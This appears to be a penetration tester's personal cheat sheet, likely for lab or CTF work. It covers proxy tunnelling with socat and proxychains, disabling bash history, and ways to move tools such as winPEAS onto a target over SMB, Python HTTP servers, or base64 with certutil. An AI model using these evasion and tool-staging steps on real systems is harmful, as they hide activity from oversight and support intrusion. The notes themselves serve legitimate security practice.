## Find the meaning of unknown error codes with certutil:
`certutil -error <error_id>`

## Access HTTPS proxy with proxychains:
Proxychains supports SOCKS4, SOCKS5 and HTTP but not HTTPS.  
Using socat to create an HTTPS tunnel between a local port and a remote proxy:  
`socat TCP-LISTEN:19999,bind=127.0.0.1,fork,reuseaddr OPENSSL:proxy.yolo.com:8000,verify=0`  
(verify=0 to bypass certificate errors, for example self-signed client certificate)  

Then in `/etc/proxychains.conf` :
`http 127.0.0.1 19999`

From <https://github.com/rofl0r/proxychains-ng/issues/337>  
 
## Temporarily turn off bash history:  
`set +o history`   
   
   
## Setting up an SSH tunnel between the target and source with nc as proxy command:  
TODO

## File transfer techniques: 
### Using SMB:  
`impacket-smbserver share .`  
Then `//10.10.14.108/share/winPEASx64.exe searchall cmd`    
  
### Using python:  
`python2 -m SimpleHTTPServer <PORT>`  
`python3 -m http.server <PORT>`  
  
### Using a compiled binary for Windows:  
`pip install pyinstaller`  
`pyinstaller web.py --onefile`  
  
`web.exe <PORT>`  
  
### Using base64 encoding:  
Server-side (Linux)  
`base64 -w 0 <FILE> | xclip -selection clipboard`  
  
Server-side (Windows). Newlines can be trimmed on Linux using sed.  
`certutil -encode <FILE> tmp_file_base64.txt`  
`sed ':a;N;$!ba;s/\n//g' <FILE>`  
  
Client-side - Linux  
`echo '<BASE64_FILECONTENT>' | base64 --decode > <OUTPUT_FILE>`  
  
Client-side - Windows  
`echo <BASE64_FILECONTENT> > tmp_file_base64.txt`  
`certutil -decode tmp_file_base64.txt <OUTPUT_FILE>`  
`del tmp_file_base64.txt`  
From <https://notes.qazeer.io/general/file_transfer>    
  
